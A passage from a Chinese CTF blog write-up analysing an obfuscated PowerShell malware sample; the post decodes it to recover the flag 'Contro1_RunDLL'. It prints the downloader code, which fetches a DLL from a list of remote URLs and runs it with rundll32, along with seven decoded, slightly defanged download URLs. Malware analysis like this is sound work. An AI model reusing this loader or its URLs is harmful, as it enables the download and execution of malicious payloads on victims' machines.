class="hljs-string">&#x27;S&#x27;</span>),([<span class="hljs-built_in">array</span>](<span class="hljs-string">&#x27;sd&#x27;</span>,<span class="hljs-string">&#x27;sw&#x27;</span>),(<span class="hljs-string">&#x27;ht&#x27;</span>+<span class="hljs-string">&#x27;tp&#x27;</span>),<span class="hljs-string">&#x27;3d&#x27;</span>)[<span class="hljs-number">1</span>]).SpLit(<span class="hljs-variable">$R71P</span> + <span class="hljs-variable">$U1uh748</span> + <span class="hljs-variable">$X49R</span>);<br><span class="hljs-variable">$I14G</span>=(<span class="hljs-string">&#x27;W&#x27;</span>+(<span class="hljs-string">&#x27;9&#x27;</span>+<span class="hljs-string">&#x27;4G&#x27;</span>));<br><br><span class="hljs-built_in">write-host</span> <span class="hljs-variable">$Ml3evql</span><br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Qx55iz5</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Ml3evql</span>) &#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        ((<span class="hljs-string">&#x27;New&#x27;</span>+<span class="hljs-string">&#x27;-Obj&#x27;</span>+<span class="hljs-string">&#x27;ect&#x27;</span>) syStEmneTWEBcliEnt)<span class="hljs-string">&quot;d`O`wnLo`ADfIlE&quot;</span>(<span class="hljs-variable">$Qx55iz5</span>, <span class="hljs-variable">$F4mnqaf</span>);<br>        <span class="hljs-variable">$G50C</span>=(<span class="hljs-string">&#x27;U&#x27;</span>+(<span class="hljs-string">&#x27;37&#x27;</span>+<span class="hljs-string">&#x27;W&#x27;</span>));<br>        <span class="hljs-keyword">If</span> ((&amp;(<span class="hljs-string">&#x27;Get-&#x27;</span>+<span class="hljs-string">&#x27;Ite&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>) <span class="hljs-variable">$F4mnqaf</span>)<span class="hljs-string">&quot;LEN`Gth&quot;</span> <span class="hljs-operator">-ge</span> <span class="hljs-number">31963</span>) &#123;&amp;(<span class="hljs-string">&#x27;r&#x27;</span>+<span class="hljs-string">&#x27;undl&#x27;</span>+<span class="hljs-string">&#x27;l32&#x27;</span>) <span class="hljs-variable">$F4mnqaf</span>,((<span class="hljs-string">&#x27;C&#x27;</span>+<span class="hljs-string">&#x27;ontro&#x27;</span>+<span class="hljs-string">&#x27;1_Ru&#x27;</span>)+<span class="hljs-string">&#x27;nD&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>).tOsTrING();<br>        <span class="hljs-variable">$H37C</span>=(<span class="hljs-string">&#x27;H&#x27;</span>+(<span class="hljs-string">&#x27;30&#x27;</span>+<span class="hljs-string">&#x27;J&#x27;</span>));<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-variable">$K4_Q</span>=(<span class="hljs-string">&#x27;M1&#x27;</span>+<span class="hljs-string">&#x27;6Q&#x27;</span>)&#125;<br>    &#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br><span class="hljs-variable">$B72H</span>=(<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;__&#x27;</span>+<span class="hljs-string">&#x27;X&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p>powerdecode进行调试</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Malandrone/PowerDecode">https://github.com/Malandrone/PowerDecode</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"> <span class="hljs-variable">$Ml3evql</span>=(<span class="hljs-string">&#x27;]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;://an&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;vatco&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>)+(<span class="hljs-string">&#x27;sp-&#x27;</span>+<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;dmin/fw&#x27;</span>)+<span class="hljs-string">&#x27;/&#x27;</span>+(<span class="hljs-string">&#x27;@]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>)+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>+(<span class="hljs-string">&#x27;/git&#x27;</span>+<span class="hljs-string">&#x27;th&#x27;</span>+<span class="hljs-string">&#x27;e&#x27;</span>)+(<span class="hljs-string">&#x27;ind&#x27;</span>+<span class="hljs-string">&#x27;ka&#x27;</span>)+(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;ire&#x27;</span>)+<span class="hljs-string">&#x27;ct&#x27;</span>+(<span class="hljs-string">&#x27;orlc&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/2&#x27;</span>+<span class="hljs-string">&#x27;/q&#x27;</span>+(<span class="hljs-string">&#x27;OY&#x27;</span>+<span class="hljs-string">&#x27;w&#x27;</span>)+<span class="hljs-string">&#x27;T&#x27;</span>+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>)+(<span class="hljs-string">&#x27;/elog&#x27;</span>+<span class="hljs-string">&#x27;sg&#x27;</span>)+(<span class="hljs-string">&#x27;4&#x27;</span>+<span class="hljs-string">&#x27;gtechn&#x27;</span>+<span class="hljs-string">&#x27;tlogie&#x27;</span>)+<span class="hljs-string">&#x27;s&#x27;</span>+(<span class="hljs-string">&#x27;com/b&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>)+(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;us/v&#x27;</span>)+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r&#x27;</span>)+(<span class="hljs-string">&#x27;[S://&#x27;</span>+<span class="hljs-string">&#x27;pa&#x27;</span>+<span class="hljs-string">&#x27;tta&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>+<span class="hljs-string">&#x27;istooe&#x27;</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/vi&#x27;</span>)+(<span class="hljs-string">&#x27;pio-&#x27;</span>+<span class="hljs-string">&#x27;z&#x27;</span>)+(<span class="hljs-string">&#x27;etw&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+(<span class="hljs-string">&#x27;xk-1&#x27;</span>+<span class="hljs-string">&#x27;h&#x27;</span>)+(<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;pp/&#x27;</span>)+(<span class="hljs-string">&#x27;c5/@&#x27;</span>+<span class="hljs-string">&#x27;]&#x27;</span>)+<span class="hljs-string">&#x27;e&#x27;</span>+(<span class="hljs-string">&#x27;1r[S&#x27;</span>+<span class="hljs-string">&#x27;:&#x27;</span>)+(<span class="hljs-string">&#x27;//rs&#x27;</span>+<span class="hljs-string">&#x27;v&#x27;</span>)+<span class="hljs-string">&#x27;ma&#x27;</span>+(<span class="hljs-string">&#x27;b&#x27;</span>+<span class="hljs-string">&#x27;in&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;hc&#x27;</span>)+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/mp&#x27;</span>+<span class="hljs-string">&#x27;-con&#x27;</span>)+(<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;qn&#x27;</span>)+(<span class="hljs-string">&#x27;t/1&#x27;</span>+<span class="hljs-string">&#x27;6&#x27;</span>+<span class="hljs-string">&#x27;qT/@&#x27;</span>+<span class="hljs-string">&#x27;]e1&#x27;</span>)+(<span class="hljs-string">&#x27;r[S&#x27;</span>+<span class="hljs-string">&#x27;s://&#x27;</span>+<span class="hljs-string">&#x27;ee&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;mo&#x27;</span>)+(<span class="hljs-string">&#x27;rey&#x27;</span>+<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;usin&#x27;</span>)+(<span class="hljs-string">&#x27;ys&#x27;</span>+<span class="hljs-string">&#x27;s/wp&#x27;</span>)+(<span class="hljs-string">&#x27;-co&#x27;</span>+<span class="hljs-string">&#x27;nte&#x27;</span>+<span class="hljs-string">&#x27;nt&#x27;</span>)+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;nuW&#x27;</span>+<span class="hljs-string">&#x27;/@]e1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;s:/&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;su&#x27;</span>+<span class="hljs-string">&#x27;ieopt&#x27;</span>)+<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;mi&#x27;</span>+(<span class="hljs-string">&#x27;pe&#x27;</span>+<span class="hljs-string">&#x27;co&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;we&#x27;</span>)+(<span class="hljs-string">&#x27;11&#x27;</span>+<span class="hljs-string">&#x27;-&#x27;</span>)+(<span class="hljs-string">&#x27;kn&#x27;</span>+<span class="hljs-string">&#x27;xwn/&#x27;</span>+<span class="hljs-string">&#x27;Ss&#x27;</span>)+(<span class="hljs-string">&#x27;E&#x27;</span>+<span class="hljs-string">&#x27;s/&#x27;</span>)).replace((<span class="hljs-string">&#x27;]&#x27;</span>+(<span class="hljs-string">&#x27;e&#x27;</span>+<span class="hljs-string">&#x27;1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>),([<span class="hljs-built_in">array</span>](<span class="hljs-string">&#x27;sd&#x27;</span>,<span class="hljs-string">&#x27;sw&#x27;</span>),(<span class="hljs-string">&#x27;ht&#x27;</span>+<span class="hljs-string">&#x27;tp&#x27;</span>),<span class="hljs-string">&#x27;3d&#x27;</span>)[<span class="hljs-number">1</span>]).SpLit(<span class="hljs-variable">$R71P</span> + <span class="hljs-variable">$U1uh748</span> + <span class="hljs-variable">$X49R</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$Ml3evql</span><br></code></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>ansvatcom<span class="hljs-regexp">/sp-ddmin/</span>fw/<br>http:<span class="hljs-regexp">//gi</span>ttheindkadirectorlcom<span class="hljs-regexp">/2/</span>qOYwT/<br>http:<span class="hljs-regexp">//</span>elogsg4gtechntlogiescom<span class="hljs-regexp">/byous/</span>v/<br>http:<span class="hljs-regexp">//</span>pattayistooecom<span class="hljs-regexp">/vipio-zetwoxk-1hmpp/</span>c5/<br>http:<span class="hljs-regexp">//</span>rsvmabinnhcom<span class="hljs-regexp">/mp-contqnt/</span><span class="hljs-number">16</span>qT/<br>https:<span class="hljs-regexp">//</span>eenmoreytusinyss<span class="hljs-regexp">/wp-content/</span>nuW/<br>https:<span class="hljs-regexp">//</span>suieoptomipecom<span class="hljs-regexp">/we11-knxwn/</span>SsEs/<br></code></pre></td></tr></table></figure>
+
+<p>看起来是下载链接</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$F4mnqaf</span>=<span class="hljs-variable">$HOME</span>+((<span class="hljs-string">&#x27;&#123;0&#125;Z3t&#x27;</span>+(<span class="hljs-string">&#x27;nc&#x27;</span>+<span class="hljs-string">&#x27;5d&#x27;</span>)+<span class="hljs-string">&#x27;&#123;0&#125;L6z3&#x27;</span>+<span class="hljs-string">&#x27;oo3&#123;0&#x27;</span>+<span class="hljs-string">&#x27;&#125;&#x27;</span>) <span class="hljs-operator">-f</span>[<span class="hljs-built_in">cHar</span>]<span class="hljs-number">92</span>)+<span class="hljs-variable">$Vlzczi0</span>+(<span class="hljs-string">&#x27;&#x27;</span>+(<span class="hljs-string">&#x27;dl&#x27;</span>+<span class="hljs-string">&#x27;l&#x27;</span>));<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$F4mnqaf</span><br>((<span class="hljs-string">&#x27;C&#x27;</span>+<span class="hljs-string">&#x27;ontro&#x27;</span>+<span class="hljs-string">&#x27;1_Ru&#x27;</span>)+<span class="hljs-string">&#x27;nD&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>).tOsTrING()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/8.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>得到Contro1_RunDLL</p>
+<p>观察整体的代码逻辑，判断获得的应该就是程序启动参数</p>
+<p>则flag{Contro1_RunDLL}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>墨者杯-样本分析</div>
+      <div>http://example.com/2024/06/06/墨者杯-样本分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>peace dawn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/05/Ciscn-Reverse/" title="Ciscn Reverse">
+                        <span class="hidden-mobile">Ciscn Reverse</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"4gMWdFLhDv2bevUzdTcBg0tg-gzGzoHsz","appKey":"eZrG2IwhtuMGp4PM0HIyWHJz","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+<script src="/js/yinghua.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
